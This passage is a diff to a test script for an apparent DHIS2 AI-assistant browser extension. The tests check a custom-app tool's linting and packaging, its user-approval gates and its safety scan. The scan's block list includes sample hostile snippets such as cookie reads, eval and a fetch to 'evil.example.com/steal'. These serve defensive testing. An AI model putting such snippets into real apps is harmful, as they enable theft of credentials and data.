@@ -38,7 +38,7 @@ const runtimeFiles = [
   'background.js', 'content.js', 'generate-icons.js',
   'src/core.js', 'src/memory.js', 'src/registry.js', 'src/providers.js',
   'src/tools-metadata.js', 'src/tools-programs.js', 'src/tools-linelists.js',
-  'src/tools-admin.js', 'src/agent.js',
+  'src/tools-admin.js', 'src/tools-apps.js', 'src/tools-apps-placement.js', 'src/agent.js',
   'sidepanel/panel.js',
 ];
 for (const rel of runtimeFiles) {
@@ -51,7 +51,7 @@ for (const rel of runtimeFiles) {
 // ── 2. Load the background modules under a chrome shim ───────────────────────
 console.log('\nModule load (importScripts order, one shared scope):');
 const loaderSrc = fs.readFileSync(path.join(ROOT, 'background.js'), 'utf8');
-const modules = [...loaderSrc.matchAll(/'(src\/[^']+\.js)'/g)].map((m) => m[1]);
+const modules = [...loaderSrc.matchAll(/'((?:src|libs)\/[^']+\.js)'/g)].map((m) => m[1]);
 if (!modules.length) bad('background.js declares no src/*.js modules');
 
 const noop = () => {};
@@ -73,7 +73,7 @@ const chrome = {
 const sandbox = {
   chrome, console,
   fetch: () => Promise.reject(new Error('fetch disabled in verify')),
-  URL, URLSearchParams, TextEncoder, TextDecoder,
+  URL, URLSearchParams, TextEncoder, TextDecoder, FormData, Blob, AbortController, AbortSignal,
   setTimeout, clearTimeout, setInterval, clearInterval, queueMicrotask,
   atob: (s) => Buffer.from(s, 'base64').toString('binary'),
   btoa: (s) => Buffer.from(s, 'binary').toString('base64'),
@@ -94,7 +94,8 @@ try {
   vm.runInContext(bundle + '\n;globalThis.__dhis2 = () => dhis2;'
     + '\n;globalThis.__TOOL_ROUTER = TOOL_ROUTER;'
     + '\n;globalThis.__realSafeDhis2Fetch = safeDhis2Fetch;' // later blocks stub ctx.safeDhis2Fetch
-    + '\n;globalThis.__memoryState = () => memoryState; globalThis.__memoryTurn = () => memoryTurn;',
+    + '\n;globalThis.__memoryState = () => memoryState; globalThis.__memoryTurn = () => memoryTurn;'
+    + '\n;globalThis.WRITE_CAPABLE_TOOL_NAMES = WRITE_CAPABLE_TOOL_NAMES; globalThis.MANUAL_TOOLS = MANUAL_TOOLS; globalThis.TOOL_SUMMARIES = TOOL_SUMMARIES; globalThis.MANUAL_EXTRAS = MANUAL_EXTRAS;',
     ctx, { filename: 'background.bundle.js' });
   loaded = true;
   ok(`loaded ${modules.length} modules: ${modules.map((m) => m.replace('src/', '')).join(', ')}`);
@@ -1673,9 +1674,590 @@ if (loaded) (async () => {
   hardeningChecksDone = true;
 })().catch((e) => { hardeningChecksDone = true; bad(`hardening checks threw: ${e && e.stack || e}`); });
 
+// ── manage_custom_app (src/tools-apps.js) ───────────────────────────────────
+// Runs from the verdict's setImmediate, AFTER every other async block has
+// drained, because it swaps the shared fetch / safeDhis2Fetch stubs. Still
+// microtask-only: the kit is served from disk through a resolved-promise fetch
+// stub, Sucrase and fflate are synchronous.
+async function runCustomAppChecks() {
+  console.log('\nCustom apps & plugins (manage_custom_app):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(`${label} => ${JSON.stringify(got)}`) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
+  const d = ctx.__dhis2();
+  const saved = { baseUrl: d.baseUrl, apiVersion: d.apiVersion, writeAuth: d.writeAuth, fetch: ctx.fetch, sdf: ctx.safeDhis2Fetch };
+  d.baseUrl = 'http://localhost:8081'; d.apiVersion = 42;
+
+  // Keys: slugified from the name, always ai-, [a-z0-9-], ≤ 40 chars.
+  eq('slug("ANC coverage widget")', ctx.slugifyCustomAppKey('ANC coverage widget'), 'ai-anc-coverage-widget');
+  eq('slug("AI Demo") keeps a single ai- prefix', ctx.slugifyCustomAppKey('AI Demo'), 'ai-demo');
+  truthy('slug of an Arabic-only name is a stable ai-app-<hash>', /^ai-app-[a-z0-9]+$/.test(ctx.slugifyCustomAppKey('ملخص الوحدات')) && ctx.slugifyCustomAppKey('ملخص الوحدات') === ctx.slugifyCustomAppKey('ملخص الوحدات'));
+  truthy('slug of a very long name is ≤ 40 chars and has no trailing hyphen', (() => { const k = ctx.slugifyCustomAppKey('A very long name for a dashboard widget that shows many things'); return k.length <= 40 && !k.endsWith('-'); })());
+  truthy('explicit key without ai- prefix is refused', !!ctx.resolveCustomAppKey({ key: 'demo' })._error);
+  truthy('explicit key with upper case / underscore is refused', !!ctx.resolveCustomAppKey({ key: 'ai-Bad_Key' })._error);
+  eq('valid explicit key is kept', ctx.resolveCustomAppKey({ key: 'ai-kpi-2' }).key, 'ai-kpi-2');
+  eq('version bump patch / minor', [ctx.bumpCustomAppVersion('1.0.0'), ctx.bumpCustomAppVersion('1.2.3', 'minor')], ['1.0.1', '1.3.0']);
+  const bk = ctx.customAppBackupKey('ai-kpi-2');
+  eq('backup key round-trips the app key (hyphenated keys)', ctx.parseCustomAppBackupKey(bk) && ctx.parseCustomAppBackupKey(bk).appKey, 'ai-kpi-2');
+  eq('a metadata backup key is not an app backup', ctx.parseCustomAppBackupKey('backup-20260708T111347Z-update-uY6mWX'), null);
+
+  // Compile: Sucrase errors carry line / column + a code frame.
+  const brokenJsx = 'const A = () => (\n  <div>\n    <span>x</div>\n);';
+  const ce = ctx.compileCustomAppFile('app.jsx', brokenJsx);
+  truthy('JSX syntax error → line/column + frame', ce.error && ce.error.line === 3 && ce.error.column > 0 && /3 \|/.test(ce.error.frame));
+  const crossed = ctx.compileCustomAppFile('app.jsx', 'const A = () => <h1 className="t">Title</h2>;');
+  truthy('crossed tags (<h1>…</h2>) are an error — Sucrase alone would compile them silently', crossed.error && /<\/h2> found where <\/h1> was expected/.test(crossed.error.message));
+  const missingParen = ctx.compileCustomAppFile('app.jsx', 'const A = () => (\n  <div>\n    {a.map(x => <b>{x}</b>}\n  </div>\n);');
+  truthy('a missing ")" before "}" is reported on its own line (not where Sucrase backtracked)', missingParen.error && missingParen.error.line === 3 && /"\)" was expected/.test(missingParen.error.message));
+  truthy('valid JSX compiles to React.createElement', /React\.createElement\(/.test(ctx.compileCustomAppFile('app.jsx', 'const A = () => <b>x</b>;').code || ''));
+
+  // Safety scan.
+  const scan = (src, opts) => ctx.scanCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, { allowedOrigin: 'http://localhost:8081', ...(opts || {}) });
+  const banned = {
+    eval: 'eval("1+1");',
+    'new-function': 'const f = new Function("return 1");',
+    cookie: 'const c = document.cookie;',
+    'browser-storage': 'localStorage.setItem("a", "b");',
+    'script-tag': 'const s = "<script src=x></script>";',
+    'external-request': 'fetch("https://evil.example.com/steal");',
+    import: 'import x from "y";',
+    require: 'const x = require("y");',
+    'html-injection': 'const A = () => <div dangerouslySetInnerHTML={{ __html: "x" }} />;',
+    socket: 'new WebSocket("wss://x");',
+  };
+  for (const [rule, src] of Object.entries(banned)) {
+    truthy(`safety scan catches ${rule}`, scan(src).some((v) => v.rule === rule));
+  }
+  truthy('UI text that merely mentions localStorage / eval() is not flagged', scan('const A = () => <p>Nothing is kept in localStorage or passed to eval()</p>;').length === 0);
+  truthy('same-origin absolute fetch is allowed', scan('fetch("http://localhost:8081/api/42/me");').length === 0);
+  const writeSrc = 'const { useDataMutation } = D2Runtime;\nconst M = { resource: "dataStore/ai-x/k", type: "create", data: {} };\nfunction A() { const [m] = useDataMutation(M); return null; }';
+  truthy('mutation refused when needs_write_access is false', scan(writeSrc).some((v) => v.rule.startsWith('write:')));
+  eq('mutation allowed when needs_write_access is true', scan(writeSrc, { needsWriteAccess: true }).length, 0);
+  truthy('fetch with method POST refused when read-only', scan('fetch("/api/42/dataStore/x/y", { method: "POST" });').some((v) => v.rule === 'write:http-write'));
+
+  // Lint: the runtime errors a blank page would otherwise hide.
+  const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
+  const lint = (src, kind = 'app') => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, kind, kitMeta);
+  const root = "\nReactDOMClient.createRoot(document.getElementById('root')).render(<A />);";
+  truthy('undeclared <Card> is an error naming the D2UI fix', lint('const A = () => <Card>x</Card>;' + root).errors.some((e) => /Card/.test(e.message) && /D2UI/.test(e.message)));
+  truthy('a name D2UI does not export is an error', lint('const { Grid } = D2UI;\nconst A = () => <Grid />;' + root).errors.some((e) => /no export "Grid"/.test(e.message)));
+  truthy('bare useState() without destructuring is an error', lint('const A = () => { const [a] = useState(0); return a; };' + root).errors.some((e) => /useState/.test(e.message)));
+  truthy('inline useDataQuery({…}) is an error (static-input trap)', lint('const { useDataQuery, DataProvider } = D2Runtime;\nconst A = () => { useDataQuery({ a: { resource: "me" } }); return null; };' + root).errors.some((e) => /inline object/.test(e.message)));
+  truthy('HeaderBar is refused (Global Shell draws it)', lint('const { HeaderBar } = D2UI;\nconst A = () => <HeaderBar />;' + root).errors.some((e) => /HeaderBar/.test(e.message)));
+  {
+    // dataStore key reads: a 404 until the key exists (live 2026-10-22).
+    const ds = (src) => lint(src + root).errors.some((e) => /is read directly, which is a 404/.test(e.message));
+    truthy('reading dataStore/<ns>/<key> directly is an error (404 until the first save)', ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => { const engine = useDataEngine(); engine.query({ n: { resource: KEY } }); return null; };"));
+    truthy('…a key path inside a mutation (type: create) is fine', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ id }) => { const engine = useDataEngine(); engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/${id}`, type: 'create', data: { a: 1 } }); return null; };"));
+    truthy('…and the filter=_:eq: read keeps the whole app clean', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst S = { s: { resource: `dataStore/${D2_APP_CONFIG.namespace}`, params: { fields: '.', filter: '_:eq:notes' } } };\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => null;"));
+  }
+  {
+    // An always-open Modal blocks the whole app (live 2026-10-22).
+    const modal = (body) => lint("const { Modal, ModalTitle } = D2UI;\nconst A = ({ t, open }) => " + body + ";" + root).errors.some((e) => /rendered unconditionally/.test(e.message));
+    truthy('an unconditional <Modal> child is an error (its backdrop blocks every click)', modal('<div><p>x</p><Modal><ModalTitle>Delete</ModalTitle></Modal></div>'));
+    truthy('…{t && <Modal>}, a ternary, hide={!open} and a component returning a Modal are fine',
+      !modal('<div>{t && <Modal><ModalTitle>D</ModalTitle></Modal>}</div>') && !modal('<div>{t ? <Modal><ModalTitle>D</ModalTitle></Modal> : null}</div>')
+      && !modal('<div><Modal hide={!open}><ModalTitle>D</ModalTitle></Modal></div>') && !modal('<Modal><ModalTitle>D</ModalTitle></Modal>'));
+  }
+  {
+    // Mutation shapes app-runtime refuses at runtime (live 2026-10-22).
+    const mu = (body) => lint("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ rest, last, k }) => { const engine = useDataEngine(); " + body + " return null; };" + root).errors.map((e) => e.message).join(' | ');
+    truthy("{ type: last ? 'delete' : 'update', data } is an error (Invalid query at runtime)", /does not support property 'data'/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: last ? 'delete' : 'update', data: rest });")));
+    truthy("{ type: 'create', id } is an error", /does not support property 'id'/.test(mu("engine.mutate({ resource: 'dataStore/x', type: 'create', id: k, data: rest });")));
+    truthy("{ type: 'delete' } without data and { type: 'update', data } are fine", !/does not support/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: 'delete' }); engine.mutate({ resource: `dataStore/x/${k}`, type: 'update', data: rest });")));
+    truthy("a non-mutation object with type 'delete' (no resource) is not flagged", !/does not support/.test(mu("const action = { type: 'delete', data: rest };")));
+  }
+  {
+    // dhis2_query: ;-joined metadata filters are a 400 (live 2026-10-22).
+    const h = ctx.healJoinedMetadataFilters;
+    const split = new URLSearchParams(h('programs?fields=id&filter=programType:eq:WITH_REGISTRATION;displayName:ilike:mch').split('?')[1]).getAll('filter');
+    truthy('joined metadata filters are split into one filter parameter each', JSON.stringify(split) === JSON.stringify(['programType:eq:WITH_REGISTRATION', 'displayName:ilike:mch']));
+    truthy('…analytics ou:A;B filters stay joined', h('analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN') === 'analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN');
+    truthy('…a single filter or a value with ; that is not an expression is untouched', h('programs?filter=displayName:eq:a') === 'programs?filter=displayName:eq:a' && h('dataElements?filter=name:like:a;b') === 'dataElements?filter=name:like:a;b');
+  }
+  truthy('a plugin without the getPropsFromParent handshake is an error', ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + root).code }, 'plugin', kitMeta).errors.some((e) => /getPropsFromParent/.test(e.message)));
+  {
+    // Capture enrollment plugins (props verified against the plugins installed on 2.42 / Capture 106).
+    const capLint = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src + root).code }, 'plugin', kitMeta, 'CAPTURE').warnings.map((w) => w.message).join(' | ');
+    const shake = "\npostRobot.send(window.parent, 'getPropsFromParent');";
+    truthy('CAPTURE: missing setPluginHeight warns that Capture sizes the widget to the reported height', /Capture sizes the widget/.test(capLint('const A = ({ enrollmentId }) => enrollmentId;' + shake)));
+    truthy('CAPTURE: a plugin that reads neither enrollmentId/teiId nor values/setFieldValue is warned', /neither enrollmentId \/ teiId/.test(capLint('const A = ({ enrollment }) => enrollment;' + shake)));
+    truthy('CAPTURE: reading enrollmentId clears that warning', !/neither enrollmentId/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => enrollmentId;' + shake)));
+    truthy('CAPTURE: a form-field plugin (values / setFieldValue) is not told to read enrollmentId', !/neither enrollmentId/.test(capLint("const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'x', value: values.y }); return null; };" + shake)));
+    truthy('CAPTURE: reporting a wrapper offsetHeight (not #root) is warned', /Report the height of #root/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => { const ref = React.useRef(null); setPluginHeight(ref.current.offsetHeight); return enrollmentId; };' + shake)));
+    truthy('DASHBOARD wording unchanged for dashboard plugins', /dashboard item keeps its default height/.test(ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + shake + root).code }, 'plugin', kitMeta, 'DASHBOARD').warnings.map((w) => w.message).join(' ')));
+    const where = ctx.customAppWhereToFind({ name: 'Meds', key: 'ai-meds', plugin_launch_url: 'http://x/api/apps/ai-meds/plugin.html' }, 'plugin', 'CAPTURE').join(' ');
+    truthy('CAPTURE where_to_find says it is not placed yet and how to place it (place action / Configurator)', /Not placed yet/.test(where) && /action="place"/.test(where) && /Tracker Plugin Configurator/.test(where));
+    truthy('the manual documents the verified Capture props', /teiId, programId, enrollmentId, orgUnitId/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
+    const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
+    truthy('a cut-off manage_custom_app call gets code-shrinking advice, not program-splitting advice', /toolName === 'manage_custom_app'\s*\n[^\n]*\n\s*\? `Write SHORTER source/.test(agentSrc));
+  }
+  const clean = "const { useState } = React;\nconst { DataProvider, useDataQuery } = D2Runtime;\nconst { Card, CircularLoader } = D2UI;\nconst Q = { me: { resource: 'me' } };\nfunction Box({ icon: Icon }) { return <Icon />; }\nfunction A() { const [n] = useState(0); const { loading } = useDataQuery(Q); return loading ? <CircularLoader /> : <Card>{n}</Card>; }\nReactDOMClient.createRoot(document.getElementById('root')).render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><A /></DataProvider>);";
+  eq('a clean read-only app lints with no errors', lint(clean).errors, []);
+  // DHIS2 app-development skill conventions → advisory warnings.
+  const warns = (src) => lint(src + root).warnings.map((w) => w.message).join(' | ');
+  truthy('warning: metadata query without fields', /without a fields parameter/.test(warns("const Q = { p: { resource: 'programs', params: { paging: false } } };\nconst A = () => null;")));
+  truthy('warning: fields with name instead of displayName', /displayName/.test(warns("const Q = { p: { resource: 'programs', params: { fields: 'id,name' } } };\nconst A = () => null;")));
+  truthy('warning: delete without a confirmation Modal', /confirmation/.test(warns("const M = { resource: 'dataStore/x/y', type: 'delete' };\nconst A = () => null;")));
+  eq('no warnings for fields id,displayName', warns("const Q = { p: { resource: 'programs', params: { fields: 'id,displayName' } } };\nconst A = () => null;"), '');
+  eq('a clean read-only app passes the safety scan', scan(clean).length, 0);
+  const uids = ctx.extractCustomAppUids({ 'app.jsx': 'const a = "fbfJHSPpUQD"; const b = "dataElement"; const c = "ProgramName"; const d = "dx:IpHINAT79UW;Eoof9sGAqcT";' });
+  eq('UID extraction: real-looking ids only, not camelCase words', uids.sort(), ['Eoof9sGAqcT', 'IpHINAT79UW', 'fbfJHSPpUQD']);
+
+  // Stubbed transport: the kit comes from disk; /api/apps answers from APPS.
+  let APPS = [];
+  let calls = [];
+  ctx.fetch = (url) => {
+    const u = String(url);
+    calls.push(u);
+    if (u.startsWith('chrome-extension://verify/')) {
+      const abs = path.join(ROOT, u.slice('chrome-extension://verify/'.length));
+      const buf = fs.existsSync(abs) ? fs.readFileSync(abs) : null;
+      return Promise.resolve({ ok: !!buf, status: buf ? 200 : 404, text: async () => buf.toString('utf8'), arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length) });
+    }
+    return Promise.reject(new Error('network disabled in verify: ' + u));
+  };
+  ctx.safeDhis2Fetch = async (p, o) => {
+    calls.push(`${(o && o.method) || 'GET'} ${p}`);
+    if (p === 'apps') return APPS;
+    if (/^metadata\?fields=id&filter=id:in:/.test(p)) return { programs: [{ id: 'fbfJHSPpUQD' }] };
+    if (p === 'system/info?fields=version') return { version: '2.42.5.1' };
+    return { _error: 'unexpected call in verify: ' + p };
+  };
+
+  // Packaging per kind: expected files, manifest fields, echarts only when used.
+  const unzip = (z) => ctx.fflate.unzipSync(z);
+  const td = new TextDecoder();
+  const mkSpec = (kind, sources, extra) => Object.assign(ctx.customAppSpecFromArgs({ name: 'Verify app', kind, plugin_type: kind === 'app' ? undefined : 'DASHBOARD' }, 'ai-verify-app', null), { sources }, extra || {});
+  const appSrc = clean;
+  const pluginSrc = "const { DataProvider } = D2Runtime;\nconst P = () => <div>p</div>;\nconst root = ReactDOMClient.createRoot(document.getElementById('root'));\npostRobot.send(window.parent, 'getPropsFromParent').then(({ data }) => root.render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><P {...data} /></DataProvider>));";
+  const kinds = {
+    app: { 'app.jsx': appSrc },
+    plugin: { 'plugin.jsx': pluginSrc },
+    app_and_plugin: { 'app.jsx': appSrc, 'plugin.jsx': pluginSrc, 'shared.jsx': 'const SHARED = 1;' },
+  };
+  for (const [kind, sources] of Object.entries(kinds)) {
+    const prep = await ctx.prepareCustomAppBuild(mkSpec(kind, { ...sources }));
+    if (prep._error) { bad(`package ${kind}: ${prep._error} ${JSON.stringify(prep.problems || prep.violations || '')}`); continue; }
+    const files = unzip(prep.pkg.zip);
+    const m = JSON.parse(td.decode(files['manifest.webapp']));
+    const ai = JSON.parse(td.decode(files['src/manifest.ai.json']));
+    const need = ['manifest.webapp', 'app-config.js', 'd2-kit.min.js', 'd2-kit.css', 'fonts/roboto-latin-400-normal.woff2', 'src/manifest.ai.json']
+      .concat(kind !== 'plugin' ? ['index.html', 'app.js', 'src/app.jsx'] : [])
+      .concat(kind !== 'app' ? ['plugin.html', 'plugin.js', 'src/plugin.jsx'] : [])
+      .concat(kind === 'app_and_plugin' ? ['shared.js', 'src/shared.jsx'] : []);
+    const missing = need.filter((f) => !files[f]);
+    truthy(`${kind}: zip has ${need.length} expected files`, missing.length === 0 || missing);
+    truthy(`${kind}: manifest short_name/developer/namespace`, m.short_name === 'ai-verify-app' && m.developer && m.developer.company === 'dhis2-ai-assistant' && m.activities.dhis.namespace === 'ai-verify-app');
+    truthy(`${kind}: launch_path ${kind === 'plugin' ? 'omitted' : 'set'}, plugin fields ${kind === 'app' ? 'omitted' : 'set'}`,
+      (kind === 'plugin' ? !m.launch_path : m.launch_path === 'index.html') && (kind === 'app' ? !m.plugin_launch_path && !m.plugin_type : m.plugin_launch_path === 'plugin.html' && m.plugin_type === 'DASHBOARD'));
+    truthy(`${kind}: AI manifest marker + file list`, ai.created_by === 'dhis2-ai-assistant' && ai.key === 'ai-verify-app' && ai.files.length === Object.keys(sources).length && ai.kit_version === kitMeta.kit_version);
+    truthy(`${kind}: no echarts.min.js when the code does not use it`, !files['echarts.min.js']);
+    truthy(`${kind}: D2_APP_CONFIG carries serverVersion {major:2,minor:42} and apiVersion 42`, /"serverVersion":\{"major":2,"minor":42,"patch":5,"full":"2\.42\.5\.1"\}/.test(td.decode(files['app-config.js'])) && /"apiVersion":42/.test(td.decode(files['app-config.js'])));
+    if (kind === 'app_and_plugin') {
+      const html = td.decode(files['plugin.html']);
+      truthy('plugin.html loads kit → config → shared → plugin in order, body.d2-plugin, dir=auto',
+        /d2-kit\.min\.js[\s\S]*app-config\.js[\s\S]*shared\.js[\s\S]*plugin\.js/.test(html) && /<body class="d2-plugin">/.test(html) && /<html dir="auto">/.test(html));
+      const capHtml = ctx.buildCustomAppHtml({ name: 'x', pluginType: 'CAPTURE', usesEcharts: false, sources: { 'plugin.jsx': '' } }, 'plugin.js');
+      truthy('a CAPTURE plugin page is auto-height (no body.d2-plugin) and links capture-plugin.css (#root flow-root)', /<body class="d2-capture-plugin">/.test(capHtml) && !/d2-plugin"/.test(capHtml) && /href="capture-plugin\.css"/.test(capHtml) && /flow-root/.test(ctx.CAPTURE_PLUGIN_CSS || vm.runInContext('CAPTURE_PLUGIN_CSS', ctx)));
+    }
+  }
+  const chartSrc = appSrc.replace('function A() {', 'function C() { const el = React.useRef(null); React.useEffect(() => { echarts.init(el.current); }, []); return <div ref={el} />; }\nfunction A() {');
+  const pc = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': chartSrc }));
+  truthy('echarts.min.js is bundled (and loaded before app.js) when the code uses echarts',
+    !pc._error && unzip(pc.pkg.zip)['echarts.min.js'] && /echarts\.min\.js[\s\S]*app\.js/.test(td.decode(unzip(pc.pkg.zip)['index.html'])));
+  const unk = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': clean.replace("resource: 'me'", "resource: 'programs/AbCdEfGh123'") }));
+  truthy('a hard-coded UID that does not exist on the server is refused', unk.unknown_uids && unk.unknown_uids[0] === 'AbCdEfGh123');
+
+  // Never touch apps the assistant did not build.
+  calls = [];
+  const notAi = await ctx.executeManageCustomApp({ action: 'delete', key: 'dashboard' });
+  truthy('delete "dashboard" (no ai- prefix) refused before any request', notAi._refused_not_managed && calls.length === 0);
+  APPS = [{ key: 'ai-demo', name: 'AI Demo', version: '1.0.0', folderName: 'apps/ai-demo' }];
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  const noMarker = await ctx.executeManageCustomApp({ action: 'update', key: 'ai-demo', files: { 'app.jsx': appSrc } });
+  truthy('update of an ai- app WITHOUT the assistant marker is refused', noMarker._refused_not_managed);
+  truthy('…without fetching its files (no probe that would 404)', !calls.some((c) => /\/api\/apps\/ai-demo\//.test(c)));
+  truthy('delete of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-demo' }))._refused_not_managed);
+  truthy('rollback of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'rollback', key: 'ai-demo' }))._refused_not_managed);
+
+  // Conflicts are caught client-side (no 409 round trip).
+  APPS = [{ key: 'ai-other', folderName: 'apps/ai-verify-app', activities: { dhis: { namespace: 'ai-verify-app' } } }];
+  const conf = ctx.customAppConflicts(mkSpec('app', {}), APPS, 'create').map((c) => c.code).sort();
+  eq('namespace + upload-folder collisions detected before upload', conf, ['folder_in_use', 'namespace_in_use']);
+
+  // requireWriteAuth gates every write action.
+  APPS = [{ key: 'ai-verify-app', name: 'Verify app', version: '1.0.0', folderName: 'apps/ai-verify-app', developer: { company: 'dhis2-ai-assistant' } }];
+  d.writeAuth = { scope: 'read_only', reason: 'verify: no authorization' };
+  const gated = (r) => r && r._scope === 'requires_user_confirmation' && /manage_custom_app/.test(r._error);
+  truthy('create is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'create', key: 'ai-verify-new', name: 'New', files: { 'app.jsx': appSrc } })));
+  truthy('delete is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-verify-app' })));
+  const aiManifest = { key: 'ai-verify-app', name: 'Verify app', kind: 'app', version: '1.0.0', created_by: 'dhis2-ai-assistant', files: ['app.jsx'] };
+  ctx.fetch = ((inner) => (url, o) => {
+    const u = String(url);
+    if (u.endsWith('/api/apps/ai-verify-app/src/manifest.ai.json')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => JSON.stringify(aiManifest) });
+    if (u.endsWith('/api/apps/ai-verify-app/src/app.jsx')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => appSrc });
+    return inner(url, o);
+  })(ctx.fetch);
+  truthy('update is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'update', key: 'ai-verify-app', files: { 'app.jsx': appSrc } })));
+  const pv = await ctx.executeManageCustomApp({ action: 'preview', name: 'Verify app 2', files: { 'app.jsx': appSrc } });
+  truthy('preview runs on a read-only turn (discovery) and returns a token', pv.preview === true && /^pv-[0-9a-f]{16}$/.test(pv.preview_token || ''));
+  {
+    // Approval = the user's next message, unless they already asked to install
+    // (GLM installed right after "Show me a preview first", live 2026-10-22).
+    const asked = ctx.userAskedToInstall;
+    for (const t of ['Please create and install and enrollment plugin here', 'yes install it', 'build it and deploy it to the server'])
+      truthy(`install intent: "${t}"`, asked(t));
+    for (const t of ['Build a dashboard widget that shows enrollments. Show me a preview first.', 'make a widget but don\'t install it yet', 'create a KPI plugin', 'preview the app first, then install'])
+      truthy(`no install intent: "${t}"`, !asked(t));
+    const turn = d.turnCounter || 0;
+    vm.runInContext('lastUserText = "Build a dashboard widget. Show me a preview first.";', ctx);
+    const same = ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn);
+    truthy('create with a preview from THIS turn is refused while the user has not approved', same && same._awaiting_approval === true && /preview_token="pv-0123456789abcdef"/.test(same._hint));
+    truthy('…and allowed once the turn has advanced (the user answered)', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn - 1) === null);
+    vm.runInContext('lastUserText = "Please create and install a medication widget";', ctx);
+    truthy('…and allowed in the same turn when the user asked to install', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn) === null);
+    vm.runInContext('lastUserText = "";', ctx);
+    vm.runInContext('lastUserText = "build me a widget";', ctx);
+    truthy('a file create with no earlier preview and no install request is refused', /has not seen a preview/.test((ctx.customAppApprovalProblem('ai-x', null, null) || {})._error || ''));
+    truthy('…allowed when the user asked to put it somewhere (placing implies installing)', (vm.runInContext('lastUserText = "create a chart plugin and add it to a new dashboard called Ops";', ctx), ctx.customAppApprovalProblem('ai-x', null, null)) === null);
+    truthy('…and allowed after a preview shown in an earlier turn', (vm.runInContext('lastUserText = "ok";', ctx), ctx.customAppApprovalProblem('ai-x', null, turn - 1)) === null);
+    vm.runInContext('lastUserText = "";', ctx);
+    const pvTurn = await ctx.recallCustomAppPreview(pv.preview_token);
+    truthy('the preview remembers the turn it was made in', pvTurn && pvTurn.spec && pvTurn.turn === turn);
+  }
+  truthy('preview / list / get_source are discovery actions; create is not',
+    ctx.isDiscoveryCall('manage_custom_app', { action: 'preview' }) && ctx.isDiscoveryCall('manage_custom_app', { action: 'list' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'create' }));
+
+  // Raw dhis2_query can no longer install / uninstall apps.
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  const rawDel = await ctx.executeTool('dhis2_query', { method: 'DELETE', path: 'apps/dashboard' });
+  truthy('dhis2_query DELETE apps/<key> is blocked → manage_custom_app', rawDel && rawDel._redirect === 'manage_custom_app');
+  // The Capture-layout block is unconditional, so its hint must not invite a
+  // "confirm and I'll write it" offer (seen live 2026-10-22 with GLM).
+  const capPut = await ctx.executeTool('dhis2_query', { method: 'PUT', path: 'dataStore/capture/enrollmentOverviewLayout', body: {} });
+  truthy('dhis2_query PUT dataStore/capture is blocked with an unconditional hint that points to the Tracker Plugin Configurator',
+    capPut && /^Blocked/.test(capPut._error || '') && /no user confirmation lifts it/.test(capPut._hint || '') && /manage_custom_app\(action="place"\)/.test(capPut._hint || '') && /Tracker Plugin Configurator/.test(capPut._hint || '') && !/confirm the exact JSON/.test(capPut._hint || ''));
+
+  // A write answered 204 is never re-sent: the empty-body retry turned a
+  // completed DELETE /api/apps/<key> into "404 App does not exist".
+  let n204 = 0;
+  ctx.fetch = () => {
+    n204++;
+    return Promise.resolve(n204 === 1
+      ? { ok: true, status: 204, statusText: 'No Content', type: 'basic', text: async () => '' }
+      : { ok: false, status: 404, statusText: 'Not Found', type: 'basic', text: async () => '{"message":"App does not exist: ai-verify-app"}' });
+  };
+  const del204 = await ctx.__realSafeDhis2Fetch('apps/ai-verify-app', { method: 'DELETE' });
+  truthy('a DELETE answered 204 is a success and is NOT re-sent', del204 && del204.success === true && n204 === 1);
+
+  // fetchViaTab: executeScript args must be cloneable — a body-less write
